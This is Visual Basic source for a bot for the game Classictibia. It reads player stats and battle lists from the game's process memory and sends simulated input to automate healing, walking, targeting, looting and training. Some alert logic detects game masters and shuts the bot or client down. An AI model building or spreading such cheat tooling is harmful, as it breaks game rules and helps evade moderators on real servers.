Imports System.Net
Imports System.Net.Mail
Imports System.IO
Imports System.ComponentModel

Public Class NativeMethods
    Public _targetProcess As Process = Nothing
    Public _targetProcessHandle As IntPtr = IntPtr.Zero
    Public procArray() As Integer
    Public processname As String = "Classictibia"

    Private Alerts As New Alerts
    Private SaveWaypoints As New SaveWaypoints
    Public Status As New Status
    Private correos As New MailMessage
    Private envios As New SmtpClient
    Private carray(0) As Timer
    Private dtRow As DataRow

    Private mailsent As Boolean = False
    Private xpstring As Integer
    Private lastXPstring As Integer
    Private xpression As Integer
    Private lightindex As Integer
    Private getping As Boolean
    Private lastbattle1 As String
    Private lastbattle2 As String
    Private savedammo As String
    Private bpitemid As Integer
    Private FishSpotsCounter As Integer = 0
    Private list As String = ""
    Private NextFish As Integer
    Private sendpointX As Integer
    Private sendpointY As Integer
    Private getid As Integer
    Private bp0index2 As Integer
    Private lastcap As Integer
    Private outoffood As Boolean = False
    Public istargeting As Boolean = False
    Private isrecording As Boolean = False
    Private dbversion As String
    Private pcversion As String
    Private ActualExp As Integer
    Private looting_listener As String = ""
    Private PID As Integer
    Private monkconfig As Boolean = False
    Private monkhealth As Integer
    Private monkbattlepos As String = ""
    Private targetingid As Integer = 1

    Private chasingXY As POINT_API
    Private loot1XY As POINT_API
    Private loot2XY As POINT_API
    Private loot3XY As POINT_API
    Private loot4XY As POINT_API
    Private runesXY As POINT_API
    Private handXY As POINT_API
    Private foodXY As POINT_API
    Private FishPos1XY As POINT_API
    Private FishPos2XY As POINT_API
    Private FishPos3XY As POINT_API
    Private FishPos4XY As POINT_API
    Private FishPos5XY As POINT_API
    Private FishPos6XY As POINT_API
    Private RodPosXY As POINT_API
    Private TrainDropXY As POINT_API
    Private TrainDrop2XY As POINT_API
    Private TrainHandXY As POINT_API
    Private StackPos1XY As POINT_API
    Private StackPos2XY As POINT_API
    Private CloseBPXY As POINT_API
    Private NorthEastXY As POINT_API
    Private NorthWestXY As POINT_API
    Private SouthEastXY As POINT_API
    Private SouthWestXY As POINT_API
    Private battle1XY As POINT_API
    Private battle2XY As POINT_API
    Private battle3XY As POINT_API
    Private monst1XY As POINT_API
    Private Main1XY As POINT_API
    Private Gold1XY As POINT_API
    Private Stack1XY As POINT_API
    Private Items1XY As POINT_API
    Private monst2XY As POINT_API
    Private Main2XY As POINT_API
    Private Gold2XY As POINT_API
    Private Stack2XY As POINT_API
    Private Items2XY As POINT_API
    Private monst3XY As POINT_API
    Private Main3XY As POINT_API
    Private Gold3XY As POINT_API
    Private Stack3XY As POINT_API
    Private Items3XY As POINT_API
    Private monst4XY As POINT_API
    Private Main4XY As POINT_API
    Private Gold4XY As POINT_API
    Private Stack4XY As POINT_API
    Private Items4XY As POINT_API
    Private NXY As POINT_API
    Private EXY As POINT_API
    Private SXY As POINT_API
    Private WXY As POINT_API
    Private meXY As POINT_API
    Private uhXY As POINT_API
    Private monkbattleXY As POINT_API
    Private firsttargetXY As POINT_API
    Private secondtargetXY As POINT_API

    'Get focus
    Public Sub GetFocus()
        Try
            AppActivate(_targetProcess.Id)
            System.Threading.Thread.Sleep(200)
            My.Computer.Keyboard.SendKeys("{ENTER}")
            System.Threading.Thread.Sleep(200)
        Catch ex As Exception
            Exit Sub
        End Try
    End Sub

    'Try to write
    Private Sub WriteValueToAddress(ByVal hProcess As IntPtr, ByVal valueAddress As Integer, ByVal value As Integer)
        Dim written As Integer
        Dim bytes() As Byte = BitConverter.GetBytes(value)
        If Not WriteProcessMemory(hProcess, New IntPtr(valueAddress), bytes, bytes.Count, written) Then Throw New Win32Exception
    End Sub

    'Find process
    Public Function TryAttachToProcess(ByVal windowCaption As String) As Boolean
        Dim _allProcesses() As Process = Process.GetProcesses
        For Each pp As Process In _allProcesses
            If pp.MainWindowTitle.ToLower.Contains(windowCaption.ToLower) Then
                'found it! proceed.
                Return TryAttachToProcess(pp)
            End If
        Next
        MessageBox.Show("Unable to find process '" & windowCaption & ".' Is running?")
        Return False
    End Function

    'Inject to process
    Public Function TryAttachToProcess(ByVal proc As Process) As Boolean
        If _targetProcessHandle = IntPtr.Zero Then 'not already attached
            _targetProcess = proc
            _targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, False, _targetProcess.Id)
            If CInt(_targetProcessHandle) = 0 Then
                TryAttachToProcess = False
                MessageBox.Show("FAIL! Are you Administrator??")
            Else
                'if we get here, all connected and ready to use ReadProcessMemory()
                TryAttachToProcess = True
            End If
        Else
            MessageBox.Show("Already attached!")
            TryAttachToProcess = False
        End If
    End Function

    'Detach injected process
    Public Sub DetachFromProcess()
        If Not (_targetProcessHandle = IntPtr.Zero) Then
            _targetProcess = Nothing
            Try
                CloseHandle(_targetProcessHandle)
                _targetProcessHandle = IntPtr.Zero
                MessageBox.Show("Detach OK")
            Catch ex As Exception
                MessageBox.Show("MemoryManager::DetachFromProcess::CloseHandle error " & Environment.NewLine & ex.Message)
            End Try
        End If
    End Sub

    'Detach injected process without msg
    Public Sub DetachFromProcess_WithoutMsg()
        If Not (_targetProcessHandle = IntPtr.Zero) Then
            _targetProcess = Nothing
            Try
                CloseHandle(_targetProcessHandle)
                _targetProcessHandle = IntPtr.Zero
            Catch ex As Exception
                MessageBox.Show("MemoryManager::DetachFromProcess::CloseHandle error " & Environment.NewLine & ex.Message)
            End Try
        End If
    End Sub

    'Running proc
    Private Function runningproc(ByVal windowCaption As String) As Boolean
        Dim _allProcesses() As Process = Process.GetProcesses
        For Each pp As Process In _allProcesses
            If pp.MainWindowTitle.ToLower.Contains(windowCaption.ToLower) Then
                Return True
            End If
        Next
        Return False
    End Function

    'Monk position tick
    Private Sub TimerMonkPos_Tick(sender As Object, e As EventArgs) Handles TimerMonkPos.Tick
        GetMouseXY(monkbattleXY)
        TimerMonkPos.Stop()
    End Sub

    'Check if character is attacking
    Private Function isattacking() As Boolean
        Dim _myBytes(3) As Byte
        ReadProcessMemory(_targetProcessHandle, battlelist1, _myBytes, 4, vbNull)
        Dim attacking = BitConverter.ToInt32(_myBytes, 0).ToString
        If attacking = "0" Then
            Return False
        Else
            Return True
        End If
    End Function

    '*************
    '* MAIN LOOP *
    '*************
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles MainLoop.Tick
        'Panic key
        If givemetheins() Then
            Application.Exit()
        End If

        'Stop / resume keys
        If givemetheend() Then
            Status.paused = True
        End If

        If givemethehome() And Status.paused Then
            Status.resumebot()
        End If

        Dim _myBytes(3) As Byte
        'On Screen
        Dim getlist1 As String
        Dim getlist2 As String
        ReadProcessMemory(_targetProcessHandle, battlelist1, _myBytes, 4, vbNull)
        getlist1 = BitConverter.ToInt32(_myBytes, 0).ToString
        ReadProcessMemory(_targetProcessHandle, battlelist2, _myBytes, 4, vbNull)
        getlist2 = BitConverter.ToInt32(_myBytes, 0).ToString
        If checkalerts.Checked Then
            If getlist1 <> "-1" Or getlist2 <> "-1" Then
                If aS11.Checked Then
                    Alerts.playsound()
                End If
                If aL11.Checked Then
                    GetFocus()
                    My.Computer.Keyboard.SendKeys("^q", True)
                End If
                If aB11.Checked Then
                    Alerts.CloseBot()
                End If
                If aX11.Checked Then
                    Alerts.CloseClient()
                End If
            End If
        End If

        'Out Screen
        If checkalerts.Checked = True Then
            If ComboBox1.Text = "1" Then
                If getlist1 <> lastbattle1 Then
                    If aS12.Checked Then
                        Alerts.playsound()
                    End If
                    If aL12.Checked Then
                        GetFocus()
                        My.Computer.Keyboard.SendKeys("^q", True)
                    End If
                    If aB12.Checked Then
                        Alerts.CloseBot()
                    End If
                    If aX12.Checked Then
                        Alerts.CloseClient()
                    End If
                End If
            ElseIf ComboBox1.Text = "2" Then
                If getlist1 <> lastbattle1 Or getlist2 <> lastbattle2 Then
                    If aS12.Checked Then
                        Alerts.playsound()
                    End If
                    If aL12.Checked Then
                        GetFocus()
                        My.Computer.Keyboard.SendKeys("^q", True)
                    End If
                    If aB12.Checked Then
                        Alerts.CloseBot()
                    End If
                    If aX12.Checked Then
                        Alerts.CloseClient()
                    End If
                End If
            End If
        End If

        If checkRuneMaker.Checked = True Then
            If CInt(labMPActual.Text) >= CInt(txtMPforRune.Text) Then
                makerune()
            End If
        End If

        If checkMana.Checked Then
            If txtMPforMana.Text <> "" And txtSpellforMana.Text <> "" And checkMana.Checked = True Then
                If CInt(labMPActual.Text) >= CInt(txtMPforMana.Text) Then
                    If Status.busy = False And Status.paused = False Then
                        capture_controls()
                        GetFocus()
                        My.Computer.Keyboard.SendKeys(txtSpellforMana.Text, True)

                        My.Computer.Keyboard.SendKeys("{ENTER}", True)
                        release_controls()
                    End If
                End If
            End If
        End If

        If txthpforuh.Text <> "" And checkUHHEAL.Checked = True Then
            If CInt(labHPActual.Text) < CInt(txthpforuh.Text) Then
                If Status.busy = False And Status.paused = False Then
                    capture_controls()
                    GetFocus()
                    System.Threading.Thread.Sleep(200)
                    Cursor.Position() = New Point(uhXY.X, uhXY.Y)
                    System.Threading.Thread.Sleep(100)
                    right_click()
                    Cursor.Position() = New Point(meXY.X, meXY.Y)
                    System.Threading.Thread.Sleep(100)
                    left_click()
                    System.Threading.Thread.Sleep(100)
                    release_controls()
                End If
            End If
        End If

        'Take spears
        takespear()

        'Check monk
        If chkMonkHP.Checked Then
            If Status.busy = False And Status.paused = False Then
                capture_controls()
                If monkconfig = False Then

                    Dim msgresult As Integer = MessageBox.Show("Take health to creature and click OK before it get 100% health again.", "Settings", MessageBoxButtons.OK)

                    'Get first battle health
                    ReadProcessMemory(_targetProcessHandle, Pointers.firstbattleHP, _myBytes, 4, vbNull)
                    Dim firstbattleHP As String = BitConverter.ToInt32(_myBytes, 0).ToString
                    'Get second battle health
                    ReadProcessMemory(_targetProcessHandle, Pointers.secondbattleHP, _myBytes, 4, vbNull)
                    Dim secondbattleHP As String = BitConverter.ToInt32(_myBytes, 0).ToString

                    If firstbattleHP > 0 And firstbattleHP < 100 Then
                        monkbattlepos = "first"
                    ElseIf secondbattleHP > 0 And secondbattleHP < 100 Then
                        monkbattlepos = "second"
                    Else
                        MsgBox("Config missing, please report to Kuhi!")
                    End If

                    If monkbattleXY.X = 0 Then
                        recording_assistant(monkbattleXY, "MONK BATTLE LIST", chkMonkHP)
                    End If

                    monkconfig = True
                Else
                    'Check monk health
                    If monkbattlepos = "first" Then
                        'Get first battle health
                        ReadProcessMemory(_targetProcessHandle, Pointers.firstbattleHP, _myBytes, 4, vbNull)
                        Dim firstbattleHP As String = BitConverter.ToInt32(_myBytes, 0).ToString
                        monkhealth = CInt(firstbattleHP)
                    Else
                        'Get second battle health
                        ReadProcessMemory(_targetProcessHandle, Pointers.secondbattleHP, _myBytes, 4, vbNull)
                        Dim secondbattleHP As String = BitConverter.ToInt32(_myBytes, 0).ToString
                        monkhealth = CInt(secondbattleHP)
                    End If

                    If monkhealth < CInt(txtMonkHP.Text) And isattacking() Then
                        GetFocus()
                        My.Computer.Keyboard.SendKeys("{ESC}", True)
                    ElseIf monkhealth > CInt(txtMonkHP.Text) And Not isattacking() Then
                        GetFocus()
                        Cursor.Position() = New Point(monkbattleXY.X, monkbattleXY.Y)
                        System.Threading.Thread.Sleep(100)
                        left_click()
                    End If
                End If
                release_controls()
            End If
        End If

        'Get last clicked id
        ReadProcessMemory(_targetProcessHandle, lastUsed, _myBytes, 4, vbNull)
        lablastclicked.Text = BitConverter.ToInt32(_myBytes, 0).ToString

        'Get positions
        posxyz()

        'Get MAX HP
        ReadProcessMemory(_targetProcessHandle, HPmax, _myBytes, 4, vbNull)
        labHPMax.Text = BitConverter.ToInt32(_myBytes, 0).ToString

        'Get MAX MANA
        ReadProcessMemory(_targetProcessHandle, MPmax, _myBytes, 4, vbNull)
        labMPMax.Text = BitConverter.ToInt32(_myBytes, 0).ToString

        'Get HP Actual
        ReadProcessMemory(_targetProcessHandle, HPaddr, _myBytes, 4, vbNull)
        labHPActual.Text = BitConverter.ToInt32(_myBytes, 0).ToString

        'Get Mana Actual
        ReadProcessMemory(_targetProcessHandle, MPaddr, _myBytes, 4, vbNull)
        labMPActual.Text = BitConverter.ToInt32(_myBytes, 0).ToString
        'Check if close bp is activated
        If checkCloseTime.Checked And Status.busy = False And Status.paused = False Then
            If CInt(labMPActual.Text) > CInt(txtmanatoclose.Text) Then
                closebp()
            End If
        End If

        'Get Capacity
        ReadProcessMemory(_targetProcessHandle, Capacity, _myBytes, 4, vbNull)
        labCapacity.Text = BitConverter.ToInt32(_myBytes, 0).ToString

        'Get Level
        ReadProcessMemory(_targetProcessHandle, Level, _myBytes, 4, vbNull)
        labLevel.Text = BitConverter.ToInt32(_myBytes, 0).ToString

        'Get LHAND ID
        ReadProcessMemory(_targetProcessHandle, LHandID, _myBytes, 4, vbNull)
        txtTrainItemID.Text = BitConverter.ToInt32(_myBytes, 0).ToString
        If savedammo <> txtTrainItemID.Text And checkalertnospears.Checked Then
            Alerts.playsound()
        End If

        'Get LHAND COUNT
        ReadProcessMemory(_targetProcessHandle, LHandCount, _myBytes, 4, vbNull)
        Dim checkstat As String = BitConverter.ToInt32(_myBytes, 0).ToString
        If txtTrainItemID.Text <> "0" And checkstat = "0" Then
            txtTrainItemCount.Text = "1"
        Else
            txtTrainItemCount.Text = checkstat
        End If

        'Get last msg from server
        Dim _my8Bytes(23) As Byte
        ReadProcessMemory(_targetProcessHandle, lastmsg, _my8Bytes, 24, vbNull)
        lablastservermsg.Text = System.Text.Encoding.Default.GetString(_my8Bytes)

        'Get Ping
        If Status.busy = False And Status.paused = False Then
            Dim Result As Net.NetworkInformation.PingReply
            Dim SendPing As New Net.NetworkInformation.Ping
            Dim ResponseTime As Long
            Try
                Result = SendPing.Send("classictibia.com")
                ResponseTime = Result.RoundtripTime
                If Result.Status = Net.NetworkInformation.IPStatus.Success Then
                    labping.Text = ResponseTime.ToString
                    labping.BackColor = Color.Green
                Else
                    labping.Text = "999"
                    labping.BackColor = Color.Red
                End If
            Catch ex As Exception
            End Try
        End If

        'Get BP0 item 1 id
        ReadProcessMemory(_targetProcessHandle, addrbp0index1, _myBytes, 4, vbNull)
        getid = BitConverter.ToInt32(_myBytes, 0).ToString
        If CInt(getid) <> bpitemid And checkbp0food.Checked Then
            outoffood = True
            Alerts.playsound()
        End If

        'Get BP0 item 2 id
        ReadProcessMemory(_targetProcessHandle, addrbp0index2, _myBytes, 4, vbNull)
        bp0index2 = BitConverter.ToInt32(_myBytes, 0).ToString

        '********
        '* WALK *
        '********
        Try
            If checkCaveBot.Checked And istargeting = False And Status.busy = False And Status.paused = False Then
                If difX() > 0 And difY() = 0 Then
                    'RIGHT
                    If Status.busy = False Then
                        'blocktimers()
                        capture_controls()
                        GetFocus()
                        My.Computer.Keyboard.SendKeys("{RIGHT}", True)
                        release_controls()
                        'releasetimers()
                        System.Threading.Thread.Sleep(200)
                    End If
                End If

                If difX() < 0 And difY() = 0 Then
                    'LEFT
                    If Status.busy = False Then
                        'blocktimers()
                        capture_controls()
                        GetFocus()
                        My.Computer.Keyboard.SendKeys("{LEFT}", True)
                        release_controls()
                        'releasetimers()
                        System.Threading.Thread.Sleep(200)
                    End If
                End If
                If difX() = 0 And difY() > 0 Then
                    'SOUTH
                    If Status.busy = False Then
                        'blocktimers()
                        capture_controls()
                        GetFocus()
                        My.Computer.Keyboard.SendKeys("{DOWN}", True)
                        release_controls()
                        'releasetimers()
                        System.Threading.Thread.Sleep(200)
                    End If
                End If
                If difX() = 0 And difY() < 0 Then
                    'NORTH
                    If Status.busy = False Then
                        'blocktimers()
                        capture_controls()
                        GetFocus()
                        My.Computer.Keyboard.SendKeys("{UP}", True)
                        release_controls()
                        'releasetimers()
                        System.Threading.Thread.Sleep(200)
                    End If
                End If
                If difX() < 0 And difY() > 0 Then
                    'SOUTH WEST
                    If Status.busy = False Then
                        'blocktimers()
                        capture_controls()
                        GetFocus()
                        click_southwest()
                        release_controls()
                        'releasetimers()
                        System.Threading.Thread.Sleep(200)
                    End If
                End If
                If difX() < 0 And difY() < 0 Then
                    'NORTH WEST
                    If Status.busy = False Then
                        'blocktimers()
                        capture_controls()
                        GetFocus()
                        click_northwest()
                        release_controls()
                        'releasetimers()
                        System.Threading.Thread.Sleep(200)
                    End If
                End If
                If difX() > 0 And difY() > 0 Then
                    'SOUTH EAST
                    If Status.busy = False Then
                        'blocktimers()
                        capture_controls()
                        GetFocus()
                        click_southeast()
                        release_controls()
                        'releasetimers()
                        System.Threading.Thread.Sleep(200)
                    End If
                End If
                If difX() > 0 And difY() < 0 Then
                    'NORTH EAST
                    If Status.busy = False Then
                        'blocktimers()
                        capture_controls()
                        GetFocus()
                        click_northeast()
                        release_controls()
                        'releasetimers()
                        System.Threading.Thread.Sleep(200)
                    End If
                End If

                If difX() = 0 And difY() = 0 Then
                    If listX.SelectedIndex = listX.Items.Count - 1 Then
                        listX.SelectedIndex = 0
                        listY.SelectedIndex = 0
                        listZ.SelectedIndex = 0
                        System.Threading.Thread.Sleep(200)
                    Else
                        listX.SelectedIndex = listX.SelectedIndex + 1
                        listY.SelectedIndex = listY.SelectedIndex + 1
                        listZ.SelectedIndex = listZ.SelectedIndex + 1
                        System.Threading.Thread.Sleep(200)
                    End If
                End If
            End If
        Catch ex As Exception
            MessageBox.Show(ex.ToString)
        End Try

        '*************
        '* TARGETING *
        '*************
        'Miramos si tenemos activado el targeting
        If checktargeting.Checked And Status.paused = False Then
            'Get first battle list
            ReadProcessMemory(_targetProcessHandle, battlelist1, _myBytes, 4, vbNull)
            Dim firstonbattle = BitConverter.ToInt32(_myBytes, 0).ToString
            If firstonbattle <> "-1" Then
                'Get targeting
                Dim targetnw As String
                ReadProcessMemory(_targetProcessHandle, Target, _myBytes, 4, vbNull)
                targetnw = BitConverter.ToInt32(_myBytes, 0).ToString

                'Check if I'm targeting
                If targetnw = "0" Then
                    capture_controls()
                    'Check first battle condition
                    Cursor.Position() = New Point(battle1XY.X, battle1XY.Y)
                    System.Threading.Thread.Sleep(200)
                    mouse_event(&H2, 0, 0, 0, 0)
                    mouse_event(&H8, 0, 0, 0, 0)
                    System.Threading.Thread.Sleep(200)
                    mouse_event(&H4, 0, 0, 0, 0)
                    mouse_event(&H10, 0, 0, 0, 0)
                    System.Threading.Thread.Sleep(400)

                    'Get battle condition msg
                    Dim _my10Bytes(9) As Byte
                    ReadProcessMemory(_targetProcessHandle, infomsg, _my10Bytes, 10, vbNull)
                    Dim msg = System.Text.Encoding.Default.GetString(_my10Bytes)

                    'Compare battle condition msg
                    If msg = "You see a " Or msg = "You see an" Then
                        Cursor.Position() = New Point(battle1XY.X, battle1XY.Y)
                        System.Threading.Thread.Sleep(200)
                        left_click()
                        release_controls()
                    ElseIf msg = "You see GM" Then
                        If checkalertifgm.Checked Then
                            Alerts.playsound()
                        End If
                        If checkcloseifgm.Checked Then
                            Alerts.CloseBot()
                        End If
                    End If
                End If
            End If
        End If

        'OPEN CORPSES N
        If Status.busy = False And Status.paused = False Then
            If checklooting.Checked And looting_listener = "Waiting" Then
                capture_controls()
                Cursor.Position() = New Point(NXY.X, NXY.Y)
                click_both()
                For i As Integer = 0 To ListMonsters.Items.Count - 1
                    If ListMonsters.Items(i).ToString = lablastclicked.Text Then
                        loot()
                    End If
                Next
            End If
        End If
        'OPEN CORPSES E
        If Status.busy = False And Status.paused = False Then
            If checklooting.Checked And looting_listener = "Waiting" Then
                capture_controls()
                Cursor.Position() = New Point(EXY.X, EXY.Y)
                click_both()
                For i As Integer = 0 To ListMonsters.Items.Count - 1
                    If ListMonsters.Items(i).ToString = lablastclicked.Text Then
                        loot()
                    End If
                Next
            End If
        End If
        'OPEN CORPSES S
        If Status.busy = False And Status.paused = False Then
            If checklooting.Checked And looting_listener = "Waiting" Then
                capture_controls()
                Cursor.Position() = New Point(SXY.X, SXY.Y)
                click_both()
                For i As Integer = 0 To ListMonsters.Items.Count - 1
                    If ListMonsters.Items(i).ToString = lablastclicked.Text Then
                        loot()
                    End If
                Next
            End If
        End If
        'OPEN CORPSES W
        If Status.busy = False And Status.paused = False Then
            If checklooting.Checked And looting_listener = "Waiting" Then
                capture_controls()
                Cursor.Position() = New Point(WXY.X, WXY.Y)
                click_both()
                For i As Integer = 0 To ListMonsters.Items.Count - 1
                    If ListMonsters.Items(i).ToString = lablastclicked.Text Then
                        loot()
                    End If
                Next
            End If
        End If
        'OPEN CORPSES NE
        If Status.busy = False And Status.paused = False Then
            If checklooting.Checked And looting_listener = "Waiting" Then
                capture_controls()
                Cursor.Position() = New Point(NorthEastXY.X, NorthEastXY.Y)
                click_both()
                For i As Integer = 0 To ListMonsters.Items.Count - 1
                    If ListMonsters.Items(i).ToString = lablastclicked.Text Then
                        loot()
                    End If
                Next
            End If
        End If
        'OPEN CORPSES SE
        If checklooting.Checked And looting_listener = "Waiting" Then
            If Status.busy = False And Status.paused = False Then
                capture_controls()
                Cursor.Position() = New Point(SouthEastXY.X, SouthEastXY.Y)
                click_both()
                For i As Integer = 0 To ListMonsters.Items.Count - 1
                    If ListMonsters.Items(i).ToString = lablastclicked.Text Then
                        loot()
                    End If
                Next
            End If
        End If
        'OPEN CORPSES NW
        If checklooting.Checked And looting_listener = "Waiting" Then
            If Status.busy = False And Status.paused = False Then
                capture_controls()
                Cursor.Position() = New Point(NorthWestXY.X, NorthWestXY.Y)
                click_both()
                For i As Integer = 0 To ListMonsters.Items.Count - 1
                    If ListMonsters.Items(i).ToString = lablastclicked.Text Then
                        loot()
                    End If
                Next
            End If
        End If

        'OPEN CORPSES SW
        If checklooting.Checked And looting_listener = "Waiting" Then
            If Status.busy = False And Status.paused = False Then
                capture_controls()
                Cursor.Position() = New Point(SouthWestXY.X, SouthWestXY.Y)
                click_both()
                For i As Integer = 0 To ListMonsters.Items.Count - 1
                    If ListMonsters.Items(i).ToString = lablastclicked.Text Then
                        loot()
                    End If
                Next
            End If
        End If

        'AUTOCHASE
        If checkautochase.Checked And Status.paused = False Then
            ReadProcessMemory(_targetProcessHandle, Chasing, _myBytes, 4, vbNull)
            Dim chasingstatus = BitConverter.ToInt32(_myBytes, 0).ToString
            If chasingstatus = 0 Then
                capture_controls()
                Cursor.Position() = New Point(chasingXY.X, chasingXY.Y)
                System.Threading.Thread.Sleep(300)
                left_click()
                release_controls()
            End If
        End If

        'CHECK IF TARGETING
        Dim targetnow As String
        ReadProcessMemory(_targetProcessHandle, Target, _myBytes, 4, vbNull)
        targetnow = BitConverter.ToInt32(_myBytes, 0).ToString

        If targetnow = "0" Then
            istargeting = False
        Else
            istargeting = True
        End If
    End Sub

    'Diagonal clicks
    Public Sub click_northeast()
        GetFocus()
        Cursor.Position() = New Point(NorthEastXY.X, NorthEastXY.Y)
        System.Threading.Thread.Sleep(100)
        left_click()
    End Sub
    Public Sub click_northwest()
        GetFocus()
        Cursor.Position() = New Point(NorthWestXY.X, NorthWestXY.Y)
        System.Threading.Thread.Sleep(100)
        left_click()
    End Sub
    Public Sub click_southeast()
        GetFocus()
        Cursor.Position() = New Point(SouthEastXY.X, SouthEastXY.Y)
        System.Threading.Thread.Sleep(100)
        left_click()
    End Sub
    Public Sub click_southwest()
        GetFocus()
        Cursor.Position() = New Point(SouthWestXY.X, SouthWestXY.Y)
        System.Threading.Thread.Sleep(100)
        left_click()
    End Sub

    'Release controls
    Public Sub release_controls()
        Status.setfree()
        PictureBox1.Image = My.Resources.banner_green
    End Sub

    'Capture controls
    Public Sub capture_controls()
        Status.setbusy()
        PictureBox1.Image = My.Resources.banner_grey
    End Sub

    'Exp calculator
    Private Sub ExpTimer_Tick(sender As Object, e As EventArgs) Handles ExpTimer.Tick
        'Get XP Actual
        Dim _myBytes(3) As Byte
        ReadProcessMemory(_targetProcessHandle, ExpActual, _myBytes, 4, vbNull)
        xpstring = BitConverter.ToInt32(_myBytes, 0)
        xpression = (xpstring - lastXPstring)
        xpression = xpression
        Me.Text = "KuhiBot          EXP: " + xpstring.ToString + "       EXP/H: " + xpression.ToString
        lastXPstring = xpstring
    End Sub

    'Refresh actual exp to look more authentic
    Private Sub ExpMiniTimer_Tick(sender As Object, e As EventArgs) Handles ExpMiniTimer.Tick
        'Get XP Actual
        Dim _myBytes(3) As Byte
        ReadProcessMemory(_targetProcessHandle, ExpActual, _myBytes, 4, vbNull)
        ActualExp = BitConverter.ToInt32(_myBytes, 0)
        Me.Text = "KuhiBot          EXP: " + ActualExp.ToString + "       EXP/H: " + xpression.ToString
        If CInt(labExp.Text) <> ActualExp Then
            labExp.Text = ActualExp.ToString
        End If
    End Sub

    'Activate TimerRunePos
    Private Sub Button1_Click_1(sender As Object, e As EventArgs)
        TimerRunePos.Enabled = True
    End Sub

    'Activate TimerHandPos
    Private Sub butHandPos_Click(sender As Object, e As EventArgs)
        TimerHandPos.Enabled = True
    End Sub

    'Timer get rune position
    Private Sub Timer1_Tick_1(sender As Object, e As EventArgs) Handles TimerRunePos.Tick
        GetMouseXY(runesXY)
        TimerRunePos.Stop()
    End Sub

    'Timer get hand position
    Private Sub TimerHandPos_Tick(sender As Object, e As EventArgs) Handles TimerHandPos.Tick
        GetMouseXY(handXY)
        TimerHandPos.Stop()
    End Sub

    'Show HELP FORM
    Private Sub butRuneHelp_Click(sender As Object, e As EventArgs)
        Dim webAddress As String = "http://www.kuhiscripts.com/"
        Process.Start(webAddress)
    End Sub

    'List processes
    Private Sub Button1_Click_2(sender As Object, e As EventArgs) Handles butPIDLIST.Click
        Dim psList() As Process
        Try
            listPIDS.Items.Clear()
            psList = Process.GetProcessesByName("Classictibia")
            For Each p As Process In psList
                SetWindowText(p.Id, p.Id.ToString)
                listPIDS.Items.Add(p.ProcessName.ToString)
                listPIDS.Items.Add(p.Id.ToString)
            Next
        Catch ex As Exception
            MessageBox.Show(ex.ToString)
        End Try
    End Sub

    'Change client
    Private Sub Button1_Click_3(sender As Object, e As EventArgs) Handles butSelectPID.Click
        Try
            If listPIDS.SelectedItem <> "Classictibia" Then
                PID = CInt(listPIDS.SelectedItem)
                If txtPID.Text <> "0" Then
                    DetachFromProcess()
                End If
                txtPID.Text = PID.ToString
                TryAttachToProcess(Process.GetProcessById(PID))
            Else
                MessageBox.Show("Select PID, not game name!", "Error!")
            End If
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    'Block timers
    Public Sub blocktimers()
        Dim i As Integer
        For Each c As Timer In Me.components.Components
            If TypeOf c Is Timer Then
                If c.Enabled And c.Interval <> MainLoop.Interval Then
                    carray(i) = c
                    ReDim Preserve carray(i + 1)
                    c.Stop()
                End If
            End If
        Next
    End Sub

    'Release timers
    Public Sub releasetimers()
        For Each c As Timer In carray
            If c IsNot Nothing Then
                c.Start()
            End If
        Next
    End Sub

    'Return XY dif
    Public Function difX() As Integer
        Dim destX As Integer = CInt(listX.Items(listX.SelectedIndex))
        Dim Xdif = destX - CInt(txtXpos.Text)
        Return Xdif
    End Function
    Public Function difY() As Integer
        Dim destY As Integer = CInt(listY.Items(listY.SelectedIndex))
        Dim Ydif = destY - CInt(txtYpos.Text)
        Return Ydif
    End Function

    '***********
    '* TRAINER *
    '***********
    'Set trainer hand position
    Private Sub Button3_Click(sender As Object, e As EventArgs)
        TimerHandTrain.Enabled = True
    End Sub
    Private Sub TimerHandTrain_Tick(sender As Object, e As EventArgs) Handles TimerHandTrain.Tick
        Dim _myBytes(3) As Byte
        GetMouseXY(TrainHandXY)
        TimerHandTrain.Stop()
    End Sub

    'Set spear ground position
    Private Sub Button8_Click_1(sender As Object, e As EventArgs)
        TimerSpearPos.Enabled = True
    End Sub
    Private Sub TimerSpearPos_Tick(sender As Object, e As EventArgs) Handles TimerSpearPos.Tick
        Dim _myBytes(3) As Byte
        GetMouseXY(TrainDropXY)
        TimerSpearPos.Stop()
    End Sub

    'Take spear
    Public Sub takespear()
        If CInt(txtTrainItemCount.Text) < CInt(txtMinSpears.Text) Then
            If checktrainer.Checked Then
                If Status.busy = False And Status.paused = False Then
                    If TrainDropXY.X <> 0 And TrainHandXY.X <> 0 Then
                        capture_controls()
                        GetFocus()
                        Cursor.Position() = New Point(TrainDropXY.X, TrainDropXY.Y)
                        System.Threading.Thread.Sleep(100)
                        Down_Mouse()
                        Cursor.Position() = New Point(TrainHandXY.X, TrainHandXY.Y)
                        System.Threading.Thread.Sleep(100)
                        Up_Mouse()
                        My.Computer.Keyboard.SendKeys("{ENTER}")
                        If TrainDrop2XY.X <> 0 And TrainHandXY.X <> 0 Then
                            If ComboTargets.Text = "2" Then
                                Cursor.Position() = New Point(TrainDrop2XY.X, TrainDrop2XY.Y)
                                System.Threading.Thread.Sleep(100)
                                Down_Mouse()
                                Cursor.Position() = New Point(TrainHandXY.X, TrainHandXY.Y)
                                System.Threading.Thread.Sleep(100)
                                Up_Mouse()
                                My.Computer.Keyboard.SendKeys("{ENTER}")
                            End If
                        End If
                        release_controls()
                    End If
                End If
            End If
        End If
    End Sub


    '****************************
    '* CAVEBOT AND MOVED ALERTS *
    '****************************
    'If check cavebot enabled then run timer
    Private Sub checkCaveBot_CheckedChanged(sender As Object, e As EventArgs) Handles checkCaveBot.CheckedChanged
        Try
            If checkCaveBot.Checked Then
                If listX.SelectedItems.Count = 0 Then
                    listX.SelectedIndex = 0
                    listY.SelectedIndex = 0
                    listZ.SelectedIndex = 0
                End If
                timerCavebot.Enabled = True
            Else
                timerCavebot.Stop()
            End If
        Catch ex As Exception
            checkCaveBot.Checked = False
        End Try
    End Sub

    'Limpiar waypoints
    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        listX.Items.Clear()
        listY.Items.Clear()
        listZ.Items.Clear()
    End Sub

    'Get diagonal pos
    Private Sub TimerNorthEastPos_Tick(sender As Object, e As EventArgs) Handles TimerNorthEastPos.Tick
        GetMouseXY(NorthEastXY)
        TimerNorthEastPos.Stop()
    End Sub
